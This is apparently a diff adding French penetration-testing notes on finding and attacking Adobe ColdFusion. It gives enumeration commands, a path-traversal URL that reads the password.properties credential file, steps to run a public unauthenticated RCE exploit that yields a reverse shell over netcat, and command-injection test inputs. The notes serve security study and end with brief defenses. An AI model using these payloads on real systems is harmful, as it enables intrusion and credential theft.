@@ -1063,6 +1063,84 @@ Actions concises pour passer de l'énumération à l'exploitation (RCE) quand po
 - Hash côté client = `sha256(username + password + "clarabibimakeseverythingsecure")`.  
 - Contournement via UNION : créer fake row contrôlée. Exemple payload username :  
 
+---
+
+# ColdFusion - Discovery & Enumeration
+
+## Objectif
+Identifier rapidement une instance **ColdFusion** et ses points d’accès (admin, CFIDE, .cfm/.cfc).
+
+## 1) Ports & Services
+- **80 / 443** → HTTP(S)  
+- **8500** → ColdFusion par défaut  
+- **5500 / 1935 / 25** → admin, RPC, SMTP  
+
+## 2) Indices ColdFusion
+- Extensions : `.cfm`, `.cfc`  
+- Dossiers : `/CFIDE/`, `/cfdocs/`, `/CFIDE/administrator/`  
+- Headers : `Server: ColdFusion`, `X-Powered-By: ColdFusion`  
+- Erreurs mentionnant CFML (`Application.cfm`, `cfquery`)
+
+## 3) Enum rapide
+- `nmap -p- -sC -Pn <target>` → repérer port 8500  
+- `curl http://<target>:8500/` → voir CFIDE / cfdocs  
+- `ffuf -u http://<target>:8500/FUZZ -w common.txt`  
+- Accéder `/CFIDE/administrator/` → login ColdFusion 8+
+
+## 4) Vulnérabilités connues
+- **File Read / Upload / RCE / XSS / Command Injection**  
+- Exemples : CVE-2021-21087, CVE-2020-24450, CVE-2019-15909  
+
+## 5) Post-enum
+- Rechercher fichiers `.cfm` sensibles, `Application.cfm`, creds hardcodés.  
+- Décompiler JAR/WAR → chercher DSN / mots de passe.  
+
+---
+
+# Attacking ColdFusion
+
+## Objectif
+Exploiter ColdFusion 8 : lecture fichiers sensibles (path traversal) et RCE non authentifiée (upload JSP) — rapide et actionnable.
+
+## 1) Rechercher exploits
+- `searchsploit adobe coldfusion`  
+- Cibles : `14641.py` (Directory Traversal, CVE-2010-2861), `50057.py` (Unauth RCE, CVE-2009-2265)
+
+## 2) Directory Traversal (CVE-2010-2861)
+- Principe : manipuler param vulnérable (ex: `locale`) dans `/CFIDE/.../mappings.cfm` pour lire fichiers.  
+- Exemple URL : `http://target:8500/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../ColdFusion8/lib/password.properties`  
+- Exploit (automatisé) : `python2 14641.py <ip> 8500 "<path/to/file>"`  
+- But : récupérer `password.properties`, `neo-datasource.xml`, etc.
+
+## 3) Unauthenticated RCE via FCKeditor (CVE-2009-2265)
+- Principe : upload JSP non authentifié -> exécution. Chemin vulnérable : `/CFIDE/scripts/ajax/FCKeditor/.../upload.cfm`  
+- Étapes :  
+  - Copier exploit : `cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .`  
+  - Éditer `50057.py` → définir `lhost`, `lport`, `rhost`, `rport`.  
+  - Lancer : `python3 50057.py`  
+  - Écouter reverse : `nc -lvnp 4444`  
+- But : JSP upload → reverse shell Windows.
+
+
+## 4) Command injection (concept rapide)
+- Si `cfexecute` utilisé sans validation : exécution OS possible.  
+- Exemple vulnérable : `<cfexecute name="cmd.exe" arguments="/c #cgi.query_string#" timeout="5">`  
+- Test simple : `http://target/index.cfm?; whoami` (ou `; echo pwned > C:\pwn.txt`) — observe résultat.
+
+
+## 5) Post-exploitation priorités
+- Lire fichiers récupérés : `password.properties`, `neo-datasource.xml` → creds DB/LDAP.  
+- Chercher webshells, comptes admin, scripts de démarrage.  
+- Pivot : utiliser creds pour accès DB/LDAP ou services internes.
+
+
+## 6) Défense rapide
+- Patch/upgrade ColdFusion, restreindre `/CFIDE/administrator` par IP, retirer FCKeditor, désactiver pages d’install/debug, WAF + surveillance uploads.
+
+---
+
+
+
 
 
 
